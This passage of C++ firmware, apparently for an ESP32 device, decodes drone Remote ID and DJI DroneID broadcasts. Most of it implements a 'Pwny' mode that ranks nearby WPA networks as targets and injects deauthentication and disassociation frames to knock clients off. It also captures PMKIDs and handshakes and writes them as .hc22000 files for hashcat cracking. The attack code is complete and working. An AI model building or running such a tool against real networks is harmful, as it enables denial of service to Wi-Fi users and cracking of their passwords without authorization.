                    uasData.SystemValid = 1;
                }
                break;
            default:
                break;
        }
        _handleDecodedDrone(&uasData, rssi, channel);
    }
}

void WiFiManager::_handleDecodedDrone(ODID_UAS_Data* data,
                                         int8_t rssi,
                                         uint8_t ch) {
    if (!data) return;

    // Need at least an ID or a location to be useful.
    bool hasId  = data->BasicIDValid[0];
    bool hasLoc = data->LocationValid;
    if (!hasId && !hasLoc) return;

    char droneId[ODID_ID_SIZE + 1] = "";
    if (hasId) {
        strlcpy(droneId, data->BasicID[0].UASID,
                sizeof(droneId));
    }

    // Use zero coords if no location yet.
    float lat = hasLoc ? data->Location.Latitude : 0.0f;
    float lon = hasLoc ? data->Location.Longitude : 0.0f;
    float alt = hasLoc ? data->Location.AltitudeGeo : 0.0f;

    if (hasLoc && !_validateCoordinates(lat, lon, alt)) return;

    strlcpy(_lastDroneID, droneId, sizeof(_lastDroneID));
    _lastDroneLat  = lat;
    _lastDroneLon  = lon;
    _lastDroneAlt  = alt;
    _lastDroneTime = millis();
    _droneDetected = true;

    STATE_WRITE_BEGIN();
    g_state.droneCount++;
    strlcpy(g_state.lastDroneID, droneId,
            sizeof(g_state.lastDroneID));
    g_state.droneAlert   = true;
    STATE_WRITE_END();

    char notifText[48];
    snprintf(notifText, sizeof(notifText), "DRONE: %s", droneId);
    _queueWiFiNotification(NOTIF_DRONE, notifText);

    MQTT_MGR.queueDrone(droneId, lat, lon, alt,
                        "", rssi, ch, "ASTM_F3411");
    DLOG_INFO("DRONE", "ID=%s lat=%.4f lon=%.4f",
              droneId, lat, lon);
}

bool WiFiManager::_validateCoordinates(float lat,
                                         float lon,
                                         float alt) {
    if (fabsf(lat) < 0.1f && fabsf(lon) < 0.1f) return false;
    if (lat < -90.0f  || lat >  90.0f)  return false;
    if (lon < -180.0f || lon > 180.0f)  return false;
    if (alt > 15000.0f || alt < -500.0f) return false;
    if (fabsf(lat - lon) < 0.0001f)     return false;
    return true;
}

bool WiFiManager::_validateSpeed(float speed) {
    return (speed >= 0.0f && speed <= 200.0f);
}

// ═════════════════════════════════════════════════════════════
//  DJI DroneID Parser
// ═════════════════════════════════════════════════════════════

bool WiFiManager::_checkDJIDroneID(const uint8_t* payload,
                                     int len,
                                     int8_t rssi,
                                     uint8_t ch) {
    if (len < 40) return false;

    // Try serial extraction at offsets 5, 6, 7
    char serial[17] = "";
    for (int offset : {5, 6, 7}) {
        if (offset + 16 > len) continue;
        bool valid = true;
        int alphaCount = 0, digitCount = 0;
        for (int i = 0; i < 14; i++) {
            uint8_t c = payload[offset + i];
            if (c == 0) break;
            if (!isalnum(c)) { valid = false; break; }
            if (isalpha(c)) alphaCount++;
            if (isdigit(c)) digitCount++;
        }
        if (valid && alphaCount >= 2 && digitCount >= 2) {
            memcpy(serial, payload + offset, 14);
            serial[14] = '\0';
            break;
        }
    }

    if (strlen(serial) < 8) return false;

    // Try GPS at offsets 24, 32, 40
    for (int offset : {24, 32, 40}) {
        if (offset + 16 > len) continue;
        double lat, lon;
        memcpy(&lat, payload + offset,     8);
        memcpy(&lon, payload + offset + 8, 8);
        if (_validateCoordinates((float)lat, (float)lon)) {
            _lastDroneLat = (float)lat;
            _lastDroneLon = (float)lon;
            break;
        }
    }

    strlcpy(_lastDroneID, serial, sizeof(_lastDroneID));
    _droneDetected = true;

    // Rate limit: 5 seconds per MAC
    uint32_t now = millis();
    if (now - _lastDroneTime < 5000) return false;
    _lastDroneTime = now;

    // Queue to MQTT
    MQTT_MGR.queueDrone(_lastDroneID,
                         _lastDroneLat, _lastDroneLon,
                         _lastDroneAlt, "", rssi, ch,
                         "dji_droneid");
    return true;
}

// ═════════════════════════════════════════════════════════════
//  PMKID Extraction
// ═════════════════════════════════════════════════════════════

bool WiFiManager::_extractPMKID(const uint8_t* eapol,
                                  int len,
                                  const uint8_t* apMAC,
                                  const uint8_t* clientMAC,
                                  const char* ssid) {
    if (len < 99) return false;

    // EAPOL-Key: type=3
    if (eapol[0] != 0x02) return false;  // version
    if (eapol[1] != 0x03) return false;  // type = Key

    // Key Info field at offset 5 (2 bytes)
    uint16_t keyInfo;
    memcpy(&keyInfo, eapol + 5, 2);
    keyInfo = __builtin_bswap16(keyInfo);

    // Must be message 1 of 4-way handshake
    // Key ACK=1, Key MIC=0, Install=0
    bool keyACK = (keyInfo >> 7) & 1;
    bool keyMIC = (keyInfo >> 8) & 1;
    if (!keyACK || keyMIC) return false;

    // Key Data length at offset 97 (2 bytes)
    uint16_t keyDataLen;
    memcpy(&keyDataLen, eapol + 97, 2);
    keyDataLen = __builtin_bswap16(keyDataLen);

    if (keyDataLen < 22 || len < 99 + (int)keyDataLen)
        return false;

    // Search Key Data for RSN IE (tag 48) with PMKID list
    const uint8_t* keyData = eapol + 99;
    int kdPos = 0;

    while (kdPos + 2 <= (int)keyDataLen) {
        uint8_t ieID = keyData[kdPos];
        uint8_t ieSz = keyData[kdPos + 1];
        if (kdPos + 2 + ieSz > (int)keyDataLen) break;

        if (ieID == 48 && ieSz >= 20) {
            // RSN IE — check for PMKID count at offset 17
            const uint8_t* rsn = keyData + kdPos + 2;
            // Skip version(2) + group cipher(4) +
            //      pairwise count(2) + pairwise(4*N) +
            //      akm count(2) + akm(4*M) + cap(2)
            // Minimum safe offset for PMKID count = 17
            if (ieSz >= 20) {
                uint16_t pmkidCount;
                memcpy(&pmkidCount, rsn + 17, 2);
                pmkidCount = __builtin_bswap16(pmkidCount);

                if (pmkidCount >= 1 && ieSz >= 37) {
                    // PMKID is 16 bytes at offset 19
                    const uint8_t* pmkid = rsn + 19;

                    if (_pmkidCount < WIFI_MAX_PMKIDS) {
                        PMKIDCapture& cap =
                            _pmkids[_pmkidCount++];
                        strlcpy(cap.ssid, ssid,
                                sizeof(cap.ssid));
                        _macToStr(apMAC, cap.bssid);
                        _macToStr(clientMAC, cap.clientMAC);
                        memcpy(cap.pmkid, pmkid, 16);
                        cap.valid = true;

                        // If this AP is a pwny target, surface the
                        // EAPOL completion state we've observed so far.
                        // Otherwise 0 (PMKID extracted from a stray M1
                        // without a tracked handshake).
                        uint8_t eapolMask = 0;
                        for (int ti = 0; ti < _pwnyTargetCount; ti++) {
                            const uint8_t ni =
                                _pwnyTargets[ti].networkIdx;
                            if (ni >= _networkCount) continue;
                            if (_macsEqual(_networks[ni].bssid, apMAC)) {
                                eapolMask =
                                    _pwnyTargets[ti].eapolMsgMask;
                                break;
                            }
                        }

                        // Queue to MQTT
                        MQTT_MGR.queuePMKID(ssid, cap.bssid,
                                             cap.clientMAC,
                                             pmkid, eapolMask);
                        // Write .hc22000 for direct hashcat
                        _writeHC22000(ssid, cap.bssid,
                                      cap.clientMAC, pmkid);

                        char notifText[48];
                        snprintf(notifText, sizeof(notifText),
                                 "PMKID: %s", ssid);
                        _queueWiFiNotification(NOTIF_PMKID, notifText);

                        DLOG_WARN("WIFI", "PMKID captured: %s", ssid);
                        return true;
                    }
                }
            }
        }
        kdPos += 2 + ieSz;
    }
    return false;
}

// ═════════════════════════════════════════════════════════════
//  Client Association Tracking
// ═════════════════════════════════════════════════════════════

void WiFiManager::_registerClientOnNetwork(
        const uint8_t* apMAC,
        const uint8_t* clientMAC,
        int8_t rssi) {

    // Ignore broadcast and multicast
    if (clientMAC[0] & 0x01) return;
    // Ignore if client IS the AP
    if (_macsEqual(apMAC, clientMAC)) return;

    // Find the network
    for (int i = 0; i < _networkCount; i++) {
        if (!_macsEqual(_networks[i].bssid, apMAC)) continue;

        WiFiNetwork& net = _networks[i];

        // Already tracking this client?
        for (int j = 0; j < net.clientCount; j++) {
            if (_macsEqual(net.clientMACs[j], clientMAC)) {
                net.clientRSSI[j]     = rssi;
                net.clientLastSeen[j] = millis();
                return;
            }
        }

        // Add new client if room
        if (net.clientCount < 8) {
            memcpy(net.clientMACs[net.clientCount],
                   clientMAC, 6);
            net.clientRSSI[net.clientCount]     = rssi;
            net.clientLastSeen[net.clientCount] = millis();
            net.clientCount++;
        }
        // Update temporal activity bitmap for Pwny
        if (_mode == WIFI_OP_PWNY) {
            _pwnyUpdateActivityBitmap(i);
        }
        return;
    }
}

// ═════════════════════════════════════════════════════════════
//  Pwny Mode
// ═════════════════════════════════════════════════════════════

bool WiFiManager::startPwnyMode() {
    CONTRACT_WARN_ONCE(CONTRACT_PWNY_OWNER_SYNC,
                       "PWNY",
                       RADIO_ARB.isOwner(RADIO_WIFI_PMKID),
                       "start requested while owner=%s",
                       RadioArbiter::ownerName(RADIO_ARB.currentOwner()));

    if (!_ensureRadioReady()) {
        _mode = WIFI_OP_IDLE;
        _radioReady = false;
        return false;
    }

    _disarmPwny("SCANNING");
    _pwnyStartMs = millis();

    // Load prior capture state so we don't re-attack already-captured targets
    _pwnyLoadPriorCaptures();

    if (!_enablePromiscuousCapture("PWNY")) {
        _mode = WIFI_OP_IDLE;
        _radioReady = false;
        _nextRadioInitAttemptMs = millis() + 5000;
        strlcpy(_pwnyStatusText, "START FAIL", sizeof(_pwnyStatusText));
        _syncPwnyState(millis());
        return false;
    }

    _mode = WIFI_OP_PWNY;
    _channelDwellMs = 200;
    _lastChannelHop = millis();
    _pwnyRebuildTargets();
    _syncPwnyState(millis());
    DLOG_INFO("PWNY", "Mode started");
    return true;
}

void WiFiManager::stopPwnyMode() {
    esp_wifi_set_promiscuous(false);
    _mode = WIFI_OP_IDLE;
    _disarmPwny("IDLE");
    DLOG_INFO("PWNY", "Mode stopped");
}

bool WiFiManager::forcePwnyDeauth() {
    if (_mode != WIFI_OP_PWNY) {
        return false;
    }

    if (!_pwnyAttacking) {
        _pwnySelectNext();
    }

    if (!_pwnyAttacking || _pwnyCurrentIdx >= _pwnyTargetCount) {
        return false;
    }

    PwnyTarget& t = _pwnyTargets[_pwnyCurrentIdx];
    WiFiNetwork& net = _networks[t.networkIdx];
    if (net.clientCount <= 0) {
        return false;
    }

    _pwnyManualDeauthRequested = true;
    t.passiveWindowEnd = 0;
    snprintf(_pwnyStatusText, sizeof(_pwnyStatusText),
             "FORCED: %.14s", net.ssid);
    _syncPwnyState(millis());
    DLOG_INFO("PWNY", "Manual deauth requested for %s", net.ssid);
    return true;
}

int16_t WiFiManager::_pwnyScore(int idx) const {
    if (idx < 0 || idx >= _networkCount) return -1;
    const WiFiNetwork& net = _networks[idx];

    if (!_ssidHasVisibleChars(net.ssid) || net.isHidden) {
        return -1;
    }

    if (net.hasPMKID || net.hasHandshake ||
        _hasStoredCapture(net.bssid)) {
        return -1;
    }

    // Check PwnyTarget completion state instead of WiFiNetwork
    for (int i = 0; i < _pwnyTargetCount; i++) {
        if (_pwnyTargets[i].networkIdx == (uint8_t)idx &&
            _pwnyTargets[i].complete) {
            return -1;
        }
    }
    // Skip ineligible
    if (_isTrustedSSID(net.ssid))              return -1;
    if (strcmp(net.security, "OPEN") == 0)     return -1;
    if (strcmp(net.security, "")     == 0)     return -1;

    // Skip if on cooldown
    uint32_t now = millis();
    for (int i = 0; i < _pwnyTargetCount; i++) {
        if (_pwnyTargets[i].networkIdx == (uint8_t)idx) {
            if (_pwnyTargets[i].complete)      return -1;
            if (now < _pwnyTargets[i].cooldownUntil) return -1;
        }
    }

    int16_t score = 0;

    // Signal — closer is better, range -90..-30 → 0..40
    int rssiClamped = max(-90, min(-30, (int)net.rssi));
    score += (int16_t)map(rssiClamped, -90, -30, 0, 40);

    // Clients — each associated client adds attack opportunity
    score += (int16_t)(net.clientCount * 25);

    // WPS — easier target
    if (net.hasWPS) score += 15;

    // Partial handshake — close to done
    for (int i = 0; i < _pwnyTargetCount; i++) {
        if (_pwnyTargets[i].networkIdx == (uint8_t)idx) {
            score += (int16_t)(_pwnyTargets[i].eapolMsgsSeen * 20);
            break;
        }
    }

    // Temporal bonus — prefer networks active at this hour
    for (int i = 0; i < _pwnyTargetCount; i++) {
        if (_pwnyTargets[i].networkIdx == (uint8_t)idx) {
            score += _pwnyTemporalBonus(_pwnyTargets[i]);
            break;
        }
    }

    return max((int16_t)0, score);
}

void WiFiManager::_pwnyRebuildTargets() {
    // Score all networks and build sorted target list
    // Keep existing target state (cooldowns, EAPOL counts)

    // Temporary scored list
    struct Candidate {
        uint8_t  netIdx;
        int16_t  score;
    };
    Candidate candidates[WIFI_MAX_NETWORKS];
    int candidateCount = 0;

    for (int i = 0; i < _networkCount; i++) {
        int16_t s = _pwnyScore(i);
        if (s < 0) continue;
        candidates[candidateCount++] = { (uint8_t)i, s };
    }

    // Sort descending by score (simple insertion sort — small N)
    for (int i = 1; i < candidateCount; i++) {
        Candidate key = candidates[i];
        int j = i - 1;
        while (j >= 0 && candidates[j].score < key.score) {
            candidates[j + 1] = candidates[j];
            j--;
        }
        candidates[j + 1] = key;
    }

    // Rebuild _pwnyTargets preserving existing state
    uint8_t newCount = (uint8_t)min(candidateCount,
                                    (int)PWNY_MAX_TARGETS);
    const uint8_t activeNetIdx =
        (_pwnyAttacking && _pwnyCurrentIdx < _pwnyTargetCount) ?
            _pwnyTargets[_pwnyCurrentIdx].networkIdx : 0xFF;

    PwnyTarget newTargets[PWNY_MAX_TARGETS] = {};
    for (int i = 0; i < newCount; i++) {
        uint8_t ni = candidates[i].netIdx;
        newTargets[i].networkIdx = ni;
        newTargets[i].score      = candidates[i].score;

        // Find best client (highest RSSI)
        uint8_t bestClient = 0;
        int8_t  bestRSSI   = -127;
        for (int c = 0; c < _networks[ni].clientCount; c++) {
            if (_networks[ni].clientRSSI[c] > bestRSSI) {
                bestRSSI   = _networks[ni].clientRSSI[c];
                bestClient = (uint8_t)c;
            }
        }
        newTargets[i].bestClientIdx = bestClient;

        // Preserve prior state if we've seen this target before
        for (int j = 0; j < _pwnyTargetCount; j++) {
            if (_pwnyTargets[j].networkIdx == ni) {
                newTargets[i].attackCount   =
                    _pwnyTargets[j].attackCount;
                newTargets[i].eapolMsgMask  =
                    _pwnyTargets[j].eapolMsgMask;
                newTargets[i].eapolMsgsSeen =
                    _pwnyTargets[j].eapolMsgsSeen;
                newTargets[i].pmkidCaptured =
                    _pwnyTargets[j].pmkidCaptured;
                newTargets[i].complete      =
                    _pwnyTargets[j].complete;
                newTargets[i].crackable     =
                    _pwnyTargets[j].crackable;
                newTargets[i].phase         =
                    _pwnyTargets[j].phase;
                newTargets[i].cooldownUntil =
                    _pwnyTargets[j].cooldownUntil;
                newTargets[i].lastAttackMs  =
                    _pwnyTargets[j].lastAttackMs;
                newTargets[i].attackWindowEnd =
                    _pwnyTargets[j].attackWindowEnd;
                newTargets[i].passiveWindowEnd =
                    _pwnyTargets[j].passiveWindowEnd;
                newTargets[i].activityBitmap =
                    _pwnyTargets[j].activityBitmap;
                newTargets[i].firstSeenMs =
                    _pwnyTargets[j].firstSeenMs;
                break;
            }
        }

        if (_networks[ni].hasPMKID || _networks[ni].hasHandshake) {
            newTargets[i].complete = true;
            newTargets[i].pmkidCaptured = _networks[ni].hasPMKID;
            newTargets[i].crackable =
                newTargets[i].crackable || _networks[ni].hasHandshake;
            newTargets[i].phase = 3;
        }
    }

    memset(_pwnyTargets, 0, sizeof(_pwnyTargets));
    memcpy(_pwnyTargets, newTargets,
           sizeof(PwnyTarget) * newCount);
    _pwnyTargetCount = newCount;

    if (_pwnyAttacking && activeNetIdx != 0xFF) {
        bool remapped = false;
        for (int i = 0; i < _pwnyTargetCount; i++) {
            if (_pwnyTargets[i].networkIdx == activeNetIdx) {
                _pwnyCurrentIdx = (uint8_t)i;
                remapped = true;
                break;
            }
        }
        if (!remapped) {
            _pwnyAttacking = false;
            _pwnyCurrentIdx = 0;
            strlcpy(_pwnyStatusText, "SCANNING",
                    sizeof(_pwnyStatusText));
            _channelDwellMs = 200;
        }
    } else if (_pwnyCurrentIdx >= _pwnyTargetCount) {
        _pwnyCurrentIdx = 0;
    }
}

void WiFiManager::_pwnySelectNext() {
    uint32_t now = millis();

    for (int i = 0; i < _pwnyTargetCount; i++) {
        PwnyTarget& t = _pwnyTargets[i];
        if (t.complete)              continue;
        if (now < t.cooldownUntil)   continue;
        _pwnyCurrentIdx = (uint8_t)i;
        _pwnyStartAttack((uint8_t)i);
        return;
    }

    // All targets on cooldown or complete
    strlcpy(_pwnyStatusText,
            _pwnyTargetCount > 0 ? "COOLDOWN" : "SCANNING",
            sizeof(_pwnyStatusText));
    _channelDwellMs = 200; // return to normal hopping
}

void WiFiManager::_pwnyStartAttack(uint8_t idx) {
    if (idx >= _pwnyTargetCount) return;

    PwnyTarget& t    = _pwnyTargets[idx];
    WiFiNetwork& net = _networks[t.networkIdx];

    t.attackCount++;
    t.lastAttackMs   = millis();
    // Set adaptive passive window before escalating to deauth
    t.passiveWindowEnd = millis() +
        _pwnyAdaptivePassiveWindow(t.networkIdx);
    t.phase = 0; // start passive
    t.attackWindowEnd = millis() +
        PWNY_ATTACK_MIN_MS +
        (esp_random() % (PWNY_ATTACK_MAX_MS -
                         PWNY_ATTACK_MIN_MS));

    _pwnyAttacking = true;

    // Lock to target channel
    esp_wifi_set_channel(net.channel, WIFI_SECOND_CHAN_NONE);
    _channelDwellMs = 60000; // don't hop while attacking

    snprintf(_pwnyStatusText, sizeof(_pwnyStatusText),
             "PASSIVE: %.14s", net.ssid);

    DLOG_INFO("PWNY",
              "Attack #%d on %s  ch=%d  clients=%d  score=%d  passive=%lu",
              t.attackCount, net.ssid,
              net.channel, net.clientCount, t.score,
              (unsigned long)(t.passiveWindowEnd - t.lastAttackMs));
}

void WiFiManager::_pwnyEndAttack(uint8_t idx, bool success) {
    if (idx >= _pwnyTargetCount) return;

    PwnyTarget& t = _pwnyTargets[idx];
    _pwnyAttacking = false;

    if (success) {
        t.complete = true;
        t.phase = 3;
        strlcpy(_pwnyStatusText, "CAPTURED",
                sizeof(_pwnyStatusText));
        DLOG_INFO("PWNY", "Target complete: %s",
                  _networks[t.networkIdx].ssid);

        // Notification via event bus — matches rest of WiFiManager
        char captureNotif[48];
        snprintf(captureNotif, sizeof(captureNotif),
                 "CAPTURED: %.20s",
                 _networks[t.networkIdx].ssid);
        _queueWiFiNotification(NOTIF_PMKID, captureNotif);

        // Increment session counter
        STATE_WRITE_BEGIN();
        g_state.sessionPMKIDs++;
        STATE_WRITE_END();
    } else {
        // Cooldown — scale with attack count
        uint32_t cooldown = PWNY_COOLDOWN_MIN_MS +
            (min((int)t.attackCount, 5) *
             ((PWNY_COOLDOWN_MAX_MS - PWNY_COOLDOWN_MIN_MS) / 5));
        t.phase = 2;
        t.cooldownUntil = millis() + cooldown;
        snprintf(_pwnyStatusText, sizeof(_pwnyStatusText),
                 "COOLDOWN: %.14s", _networks[t.networkIdx].ssid);
        DLOG_INFO("PWNY", "Cooldown %lus on %s",
                  cooldown / 1000,
                  _networks[t.networkIdx].ssid);
    }

    _channelDwellMs = 200; // resume hopping
}

void WiFiManager::_syncPwnyState(uint32_t now) {
    STATE_WRITE_BEGIN();
    const int syncCount = min((int)_pwnyTargetCount, 8);
    g_state.pwnyTargetCount = (uint8_t)syncCount;
    for (int i = 0; i < 8; i++) {
        SpectreState::PwnyTargetDisplay& d = g_state.pwnyTargets[i];
        d = SpectreState::PwnyTargetDisplay{};
        if (i >= syncCount) {
            continue;
        }

        const uint8_t ni = _pwnyTargets[i].networkIdx;
        const PwnyTarget& t = _pwnyTargets[i];
        strlcpy(d.ssid, _networks[ni].ssid, sizeof(d.ssid));
        d.score       = t.score;
        d.clients     = _networks[ni].clientCount;
        d.complete    = t.complete;
        d.onCooldown  = (now < t.cooldownUntil);
        d.pmkid       = t.pmkidCaptured;
        d.eapolSeen   = t.eapolMsgsSeen;
        d.eapolMask   = t.eapolMsgMask;
        d.crackable   = t.crackable;
        d.rssi        = _networks[ni].rssi;
        d.attackCount = t.attackCount;
        d.phase       = t.phase;
    }
    strlcpy(g_state.pwnyStatus, _pwnyStatusText,
            sizeof(g_state.pwnyStatus));
    g_state.pwnyCurrentIdx = 0;
    if (syncCount > 0) {
        const uint8_t lastIdx = static_cast<uint8_t>(syncCount - 1);
        g_state.pwnyCurrentIdx =
            (_pwnyCurrentIdx > lastIdx) ? lastIdx : _pwnyCurrentIdx;
    }
    g_state.pwnyTotalCaptures = _pwnyCaptures;
    g_state.pwnyTotalAttempts = _pwnyAttempts;
    g_state.pwnySessionMs =
        (_mode == WIFI_OP_PWNY && _pwnyStartMs > 0) ? (now - _pwnyStartMs) : 0;
    STATE_WRITE_END();
}

void WiFiManager::_pwnyTick() {
    uint32_t now = millis();

    // Rebuild target scores periodically
    if (!_pwnyAttacking &&
        now - _pwnyLastScoreMs > PWNY_SCORE_INTERVAL_MS) {
        _pwnyRebuildTargets();
        _pwnyLastScoreMs = now;
    }

    if (_pwnyAttacking) {
        if (_pwnyCurrentIdx >= _pwnyTargetCount) {
            _pwnyAttacking = false;
            _pwnyCurrentIdx = 0;
            strlcpy(_pwnyStatusText, "SCANNING",
                    sizeof(_pwnyStatusText));
            _channelDwellMs = 200;
            _syncPwnyState(now);
            return;
        }
        PwnyTarget& t = _pwnyTargets[_pwnyCurrentIdx];

        // Check completion conditions — early-exit so we don't keep
        // spending TX budget on a target we've already captured.
        for (int i = 0; i < _pmkidCount; i++) {
            char bssidStr[18];
            _macToStr(_networks[t.networkIdx].bssid, bssidStr);
            if (strcmp(_pmkids[i].bssid, bssidStr) == 0) {
                t.pmkidCaptured = true;
                _networks[t.networkIdx].hasPMKID = true;
                _pwnyCaptures++;
                const bool full = (t.eapolMsgMask & 0x0F) == 0x0F;
                DLOG_INFO("PWNY",
                          "Early-exit: PMKID captured on %s (eapol=0x%X%s)",
                          _networks[t.networkIdx].ssid,
                          (unsigned)t.eapolMsgMask,
                          full ? " FULL-4WAY" : "");
                _pwnyEndAttack(_pwnyCurrentIdx, true);
                return;
            }
        }
        // Full 4-way handshake is the gold standard — log it distinctly
        // so operator logs show *why* the target closed early.
        if ((t.eapolMsgMask & 0x0F) == 0x0F) {
            _pwnyCaptures++;
            DLOG_INFO("PWNY",
                      "Early-exit: full 4-way on %s (M1+M2+M3+M4)",
                      _networks[t.networkIdx].ssid);
            _pwnyEndAttack(_pwnyCurrentIdx, true);
            return;
        }
        if (t.crackable || _networks[t.networkIdx].hasHandshake) {
            _pwnyCaptures++;
            DLOG_INFO("PWNY",
                      "Early-exit: crackable handshake on %s (eapol=0x%X)",
                      _networks[t.networkIdx].ssid,
                      (unsigned)t.eapolMsgMask);
            _pwnyEndAttack(_pwnyCurrentIdx, true);
            return;
        }

        // Phase management: passive → deauth escalation
        if (t.phase == 0 && now > t.passiveWindowEnd) {
            // Passive window expired without capture
            // Escalate to deauth if we have clients
            WiFiNetwork& net = _networks[t.networkIdx];
            if (net.clientCount > 0) {
                if (!_pwnyActiveAttacksAllowed()) {
                    DLOG_INFO("PWNY",
                              "Active deauth gated for %s",
                              net.ssid);
                    _pwnyEndAttack(_pwnyCurrentIdx, false);
                    return;
                }

                t.phase = 1; // deauth phase
                snprintf(_pwnyStatusText, sizeof(_pwnyStatusText),
                         "DEAUTH: %.12s", net.ssid);
                const uint8_t* clientMAC =
                    net.clientMACs[t.bestClientIdx];
                const bool burstSent =
                    _sendPwnyAttackBurst(net.bssid, clientMAC,
                                         net.channel);
                _pwnyManualDeauthRequested = false;
                if (burstSent) {
                    _pwnyAttempts++;
                    DLOG_INFO("PWNY",
                              "Attack burst sent to client %d of %s",
                              t.bestClientIdx, net.ssid);
                } else {
                    DLOG_WARN("PWNY",
                              "Attack burst suppressed for %s",
                              net.ssid);
                }
            } else {
                // No clients — extend passive window briefly
                t.passiveWindowEnd = now + 2000;
            }
        }

        // Attack window expired
        if (now > t.attackWindowEnd) {
            t.phase = 2; // cooldown
            _pwnyEndAttack(_pwnyCurrentIdx, false);
        }
        return;
    }
    // Not attacking — time to select next target
    if (now - _pwnyLastRotateMs > 1000) {
        _pwnyLastRotateMs = now;
        _pwnySelectNext();
    }

    _syncPwnyState(now);
}

bool WiFiManager::_pwnyTxRateAllowed() {
    const uint32_t now = millis();
    if (_pwnyTxWindowStartMs == 0 ||
        now - _pwnyTxWindowStartMs >= 1000) {
        _pwnyTxWindowStartMs = now;
        _pwnyTxPacketCount = 0;
    }

    if (_pwnyTxPacketCount >= PWNY_MAX_TX_PACKETS_PER_SEC) {
        return false;
    }

    _pwnyTxPacketCount++;
    return true;
}

bool WiFiManager::_sendPwnyMgmtFrame(
        uint8_t frameControl,
        const uint8_t* sourceMAC,
        const uint8_t* destMAC,
        const uint8_t* bssid,
        uint8_t channel) {
    if (_mode != WIFI_OP_PWNY || !_pwnyActiveAttacksAllowed()) {
        return false;
    }
    if (!sourceMAC || !destMAC || !bssid || !_pwnyTxRateAllowed()) {
        return false;
    }

    uint8_t frame[26] = {};

    frame[0] = frameControl;
    frame[1] = 0x00;
    frame[2] = 0x3A;
    frame[3] = 0x01;
    memcpy(frame + 4, destMAC, 6);
    memcpy(frame + 10, sourceMAC, 6);
    memcpy(frame + 16, bssid, 6);
    const uint16_t seq = static_cast<uint16_t>((esp_random() & 0x0FFF) << 4);
    frame[22] = seq & 0xFF;
    frame[23] = (seq >> 8) & 0xFF;
    frame[24] = 0x07;
    frame[25] = 0x00;

    const esp_err_t chErr =
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (chErr != ESP_OK) {
        DLOG_WARN("PWNY", "Attack channel set failed: %s",
                  esp_err_to_name(chErr));
        return false;
    }

    wifi_mode_t wifiMode = WIFI_MODE_NULL;
    esp_wifi_get_mode(&wifiMode);
    const wifi_interface_t txIf =
        (wifiMode == WIFI_MODE_AP || wifiMode == WIFI_MODE_APSTA)
            ? WIFI_IF_AP
            : WIFI_IF_STA;
    esp_err_t err = esp_wifi_80211_tx(
        txIf, frame, sizeof(frame), false);

    if (err != ESP_OK) {
        DLOG_WARN("PWNY", "Attack TX failed fc=0x%02x if=%d err=%s",
                  frameControl, static_cast<int>(txIf),
                  esp_err_to_name(err));
        return false;
    }
    return true;
}

bool WiFiManager::_sendPwnyAttackBurst(
        const uint8_t* apMAC,
        const uint8_t* clientMAC,
        uint8_t channel) {
    if (!apMAC || !clientMAC) {
        return false;
    }

    const bool isBroadcast =
        memcmp(clientMAC, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) == 0;
    bool sent = false;

    for (int i = 0; i < 2; i++) {
        sent |= _sendPwnyMgmtFrame(0xC0, apMAC, clientMAC,
                                   apMAC, channel);
        sent |= _sendPwnyMgmtFrame(0xA0, apMAC, clientMAC,
                                   apMAC, channel);
    }

    if (!isBroadcast) {
        for (int i = 0; i < 2; i++) {
            sent |= _sendPwnyMgmtFrame(0xC0, clientMAC, apMAC,
                                       clientMAC, channel);
            sent |= _sendPwnyMgmtFrame(0xA0, clientMAC, apMAC,
                                       clientMAC, channel);
        }
    }

    return sent;
}

void WiFiManager::_disarmPwny(const char* status) {
    _pwnyManualDeauthRequested = false;
    _pwnyTargetCount = 0;
    _pwnyCurrentIdx = 0;
    _pwnyLastScoreMs = 0;
    _pwnyLastRotateMs = 0;
    _pwnyAttacking = false;
    _pwnyStartMs = 0;
    _pwnyCaptures = 0;
    _pwnyAttempts = 0;
    _pwnyTxWindowStartMs = 0;
    _pwnyTxPacketCount = 0;
    memset(_pwnyTargets, 0, sizeof(_pwnyTargets));
    strlcpy(_pwnyStatusText,
            (status && status[0]) ? status : "IDLE",
            sizeof(_pwnyStatusText));
    _syncPwnyState(millis());
}

bool WiFiManager::_pwnyActiveAttacksAllowed() const {
    return PWNY_ACTIVE_ATTACKS_ENABLED || _pwnyManualDeauthRequested;
}

// ═════════════════════════════════════════════════════════════
//  Pwny helpers — temporal, adaptive, crackability
// ═════════════════════════════════════════════════════════════

void WiFiManager::_pwnyLoadPriorCaptures() {
    // Mark networks complete if we already have their hc22000 file
    if (!LittleFS.exists(PATH_PMKID_DIR)) return;

    File dir = LittleFS.open(PATH_PMKID_DIR);
    if (!dir || !dir.isDirectory()) return;

    File f = dir.openNextFile();
    while (f) {
        // Filename: {bssidHex}.hc22000
        // Reconstruct BSSID string XX:XX:XX:XX:XX:XX
        const char* name = f.name();
        int nameLen = strlen(name);
        // Strip path prefix if present
        const char* base = strrchr(name, '/');
        if (base) base++; else base = name;

        // Must be 12 hex chars + .hc22000
        if (nameLen >= 19) {
            char bssidHex[13] = "";
            strncpy(bssidHex, base, 12);
            bssidHex[12] = '\0';

            // Convert to XX:XX:XX:XX:XX:XX
            char bssidStr[18] = "";
            snprintf(bssidStr, sizeof(bssidStr),
                     "%c%c:%c%c:%c%c:%c%c:%c%c:%c%c",
                     bssidHex[0],  bssidHex[1],
                     bssidHex[2],  bssidHex[3],
                     bssidHex[4],  bssidHex[5],
                     bssidHex[6],  bssidHex[7],
                     bssidHex[8],  bssidHex[9],
                     bssidHex[10], bssidHex[11]);

            // Find matching network and mark complete
            for (int i = 0; i < _networkCount; i++) {
                char netBssid[18];
                _macToStr(_networks[i].bssid, netBssid);
                // Case-insensitive compare
                if (strcasecmp(netBssid, bssidStr) == 0) {
                    _networks[i].hasPMKID = true;
                    DLOG_INFO("PWNY",
                              "Prior capture: %s",
                              _networks[i].ssid);
                    break;
                }
            }
        }
        f = dir.openNextFile();
    }
}

bool WiFiManager::_hasStoredCapture(const uint8_t* bssid) const {
    if (!bssid || !LittleFS.exists(PATH_PMKID_DIR)) {
        return false;
    }

    char bssidHex[13];
    snprintf(bssidHex, sizeof(bssidHex),
             "%02x%02x%02x%02x%02x%02x",
             bssid[0], bssid[1], bssid[2],
             bssid[3], bssid[4], bssid[5]);

    char path[32];
    snprintf(path, sizeof(path), PATH_PMKID_DIR "/%s.hc22000", bssidHex);
    return LittleFS.exists(path);
}

bool WiFiManager::_pwnyIsHandshakeCrackable(
        uint8_t msgMask) const {
    // Need msg1+msg2 OR msg2+msg3 OR msg2+msg4
